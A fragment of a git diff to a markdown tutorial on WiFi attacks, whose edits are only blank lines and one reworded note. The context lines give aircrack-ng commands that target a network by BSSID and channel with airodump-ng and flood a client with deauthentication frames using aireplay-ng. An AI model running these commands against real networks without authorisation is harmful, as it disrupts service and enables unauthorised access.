@@ -30,6 +30,7 @@ airmon-ng start wlan0mon
 iwconfig
 rfkill list
 
+
 clear
 exit
 exit
@@ -44,7 +45,7 @@ Now run the following commands :
 airodump-ng wlan0mon
 
 - - -ctrl + C to stop
-- - -Can close if don't work
+- - -Can close if done work
 ```
 So, when it dispaly the required network then we can stop the process with 'ctrl + C' shortcut. But don't close this tab, it helps to copy network's channel no. & BSSID.  
 <br>
@@ -55,11 +56,13 @@ Now open new terminal tab and run the following commands :
 ```
 sudo su
 
+
 airodump-ng wlan0mon --bssid "_" -c "_"
 	(OR)
 airodump-ng --bssid "_" -c "_" wlan0mon
 	(OR)
 airodump-ng -c_ -d "__BSS-ID__" wlan0mon
+
 
 - - - - -Keep running, don't close
 ```
@@ -71,6 +74,7 @@ airodump-ng -c_ -d "__BSS-ID__" wlan0mon
 Now open new terminal tab and run the following commands :  
 ```
 sudo
+
 
 aireplay-ng --deauth 0 -a "___BSS-ID___" -c "__STATION__" wlan0mon
 	(OR)
